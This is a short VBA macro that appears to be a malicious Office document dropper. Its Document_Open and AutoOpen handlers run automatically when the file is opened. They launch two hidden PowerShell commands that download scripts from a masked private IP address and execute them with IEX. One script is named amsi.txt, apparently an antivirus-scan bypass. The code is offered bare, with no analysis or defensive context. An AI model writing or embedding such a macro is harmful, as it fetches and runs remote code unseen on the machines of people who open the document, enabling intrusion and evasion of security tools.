Sub MyMacro()
    Dim str As String
    s = "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.XX.XX/amsi.txt') | IEX"
    s1 = "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.XX.XX/shang.txt') | IEX"
    Shell s, vbHide
    Shell s1, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
